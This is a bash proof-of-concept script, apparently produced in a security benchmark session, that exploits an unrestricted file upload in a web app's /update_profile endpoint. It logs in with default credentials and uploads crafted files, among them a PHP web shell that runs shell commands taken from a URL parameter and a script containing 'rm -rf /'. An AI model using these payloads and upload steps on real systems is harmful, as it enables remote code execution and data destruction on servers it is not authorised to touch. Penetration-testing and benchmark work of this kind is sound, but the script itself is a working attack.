#!/bin/bash
# POC: Demonstrates unrestricted file type upload vulnerability by uploading files with arbitrary extensions (.php, .exe, .sh, .phtml) to the /update_profile endpoint without validation errors
# Target: ./repo
# Created: 2025-11-07T16:08:42.255Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# Proof of Concept: Unrestricted File Type Upload
# Target: /update_profile endpoint
# Vulnerability: No file type validation - accepts arbitrary file extensions

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/update_profile"
FULL_URL="${TARGET_URL}${ENDPOINT}"

echo "[*] Testing Unrestricted File Type Upload Vulnerability"
echo "[*] Target: $FULL_URL"
echo ""

# First, authenticate to get a session
echo "[*] Step 1: Authenticating with default credentials (test:test)..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST "${TARGET_URL}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test")

if echo "$LOGIN_RESPONSE" | grep -q "error\|failed\|invalid"; then
  echo "[-] Authentication failed"
  exit 1
fi
echo "[+] Authentication successful"
echo ""

# Test 1: Upload file with .php extension
echo "[*] Step 2: Testing upload with .php extension (should be rejected but isn't)..."
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

PHP_RESPONSE=$(curl -s -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/shell.php" \
  "${FULL_URL}")

echo "[*] Response for .php upload:"
echo "$PHP_RESPONSE" | head -20
HTTP_CODE_PHP=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/shell.php" \
  "${FULL_URL}")
echo "[*] HTTP Status Code for .php: $HTTP_CODE_PHP"
echo ""

# Test 2: Upload file with .exe extension
echo "[*] Step 3: Testing upload with .exe extension (should be rejected but isn't)..."
echo "MZ" > /tmp/payload.exe

EXE_RESPONSE=$(curl -s -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/payload.exe" \
  "${FULL_URL}")

echo "[*] Response for .exe upload:"
echo "$EXE_RESPONSE" | head -20
HTTP_CODE_EXE=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/payload.exe" \
  "${FULL_URL}")
echo "[*] HTTP Status Code for .exe: $HTTP_CODE_EXE"
echo ""

# Test 3: Upload file with .sh extension
echo "[*] Step 4: Testing upload with .sh extension (should be rejected but isn't)..."
echo "#!/bin/bash\nrm -rf /" > /tmp/malicious.sh

SH_RESPONSE=$(curl -s -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/malicious.sh" \
  "${FULL_URL}")

echo "[*] Response for .sh upload:"
echo "$SH_RESPONSE" | head -20
HTTP_CODE_SH=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/malicious.sh" \
  "${FULL_URL}")
echo "[*] HTTP Status Code for .sh: $HTTP_CODE_SH"
echo ""

# Test 4: Upload file with .phtml extension
echo "[*] Step 5: Testing upload with .phtml extension (should be rejected but isn't)..."
echo '<?php echo "executed"; ?>' > /tmp/payload.phtml

PHTML_RESPONSE=$(curl -s -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/payload.phtml" \
  "${FULL_URL}")

echo "[*] Response for .phtml upload:"
echo "$PHTML_RESPONSE" | head -20
HTTP_CODE_PHTML=$(curl -s -o /dev/null -w "%{http_code}" -b /tmp/cookies.txt \
  -F "user_id=1" \
  -F "name=TestUser" \
  -F "lastname=Test" \
  -F "email=test@example.com" \
  -F "loan_amount=5000" \
  -F "loan_term_months=12" \
  -F "monthly_payment=500" \
  -F "image_profile=@/tmp/payload.phtml" \
  "${FULL_URL}")
echo "[*] HTTP Status Code for .phtml: $HTTP_CODE_PHTML"
echo ""

# Summary
echo "[*] VULNERABILITY ANALYSIS SUMMARY:"
echo "======================================"
echo "[*] The endpoint accepts uploads without file type validation:"
echo "    - .php files: HTTP $HTTP_CODE_PHP (No validation error)"
echo "    - .exe files: HTTP $HTTP_CODE_EXE (No validation error)"
echo "    - .sh files:  HTTP $HTTP_CODE_SH (No validation error)"
echo "    - .phtml files: HTTP $HTTP_CODE_PHTML (No validation error)"
echo ""
echo "[+] CONFIRMED: Arbitrary file extensions are accepted by the upload endpoint"
echo "[+] IMPACT: No file type validation allows potential RCE via executable uploads"
echo ""

# Cleanup
rm -f /tmp/shell.php /tmp/payload.exe /tmp/malicious.sh /tmp/payload.phtml /tmp/cookies.txt

exit 0